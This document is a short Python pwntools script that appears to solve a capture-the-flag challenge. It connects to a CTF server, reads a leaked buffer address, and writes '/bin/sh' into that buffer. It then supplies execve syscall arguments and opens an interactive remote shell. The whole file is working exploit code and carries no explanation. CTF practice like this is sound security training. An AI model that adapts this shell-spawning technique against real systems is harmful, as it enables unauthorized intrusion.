#!/usr/bin/python3

from pwn import *

# Define constants
EXECVE_SYSCALL_NUMBER = 59

# Create a connection
def create_connection(target, port):
    return remote(target, port)

# Receive the buffer address
def get_buffer_address(conn):
    conn.recvuntil(b"Address: ")
    buffer_address = int(conn.recvline().strip(), 16)
    log.info("buff: %#x", buffer_address)
    return buffer_address

# Send a command to the buffer
def send_command_to_buffer(conn, command):
    conn.sendlineafter(b"> ", command)

# Send syscall arguments
def send_syscall_arguments(conn, syscall_number, buffer_address):
    conn.sendlineafter(b"arg[0]: ", str(syscall_number).encode())
    conn.sendlineafter(b"arg[1]: ", str(buffer_address).encode())

    # Sending zeros for the rest of the arguments
    for i in range(2, 7):
        conn.sendlineafter(f"arg[{i}]: ".encode(), b"0")

# Main function
def main():
    # Prepare context
    context.binary = ELF("chall")
    context.arch = 'amd64'
    
    # Connect to the target
    connection = create_connection("ctf99.cs.ui.ac.id", 10011)
    
    # Get buffer address
    buffer_address = get_buffer_address(connection)

    # Send "/bin/sh" to the buffer
    send_command_to_buffer(connection, b"/bin/sh")
    
    # Send syscall arguments
    send_syscall_arguments(connection, EXECVE_SYSCALL_NUMBER, buffer_address)

    # Interact with the shell
    connection.interactive()

# Run main function
if __name__ == "__main__":
    main()
